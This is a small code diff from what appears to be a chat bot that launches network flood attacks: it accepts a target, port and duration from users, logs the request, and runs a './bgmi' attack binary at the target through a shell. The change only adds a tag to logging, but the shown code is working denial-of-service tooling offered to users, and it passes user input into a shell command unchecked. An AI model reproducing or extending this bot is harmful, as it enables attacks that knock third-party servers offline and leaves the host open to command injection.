@@ -389,7 +389,7 @@ def initialize_bot(bot, bot_id):
                 if user_id not in allowed_admin_ids and time > 300:
                     response = "Error: Time interval must be less than 300."
                 else:
-                    log_command(user_id, target, port, time)
+                    log_command(user_id, target, port, time, '/bgmi')
                     start_attack_reply(message, target, port, time)  
                     full_command = f"./bgmi {target} {port} {time} 200"
                     subprocess.run(full_command, shell=True)
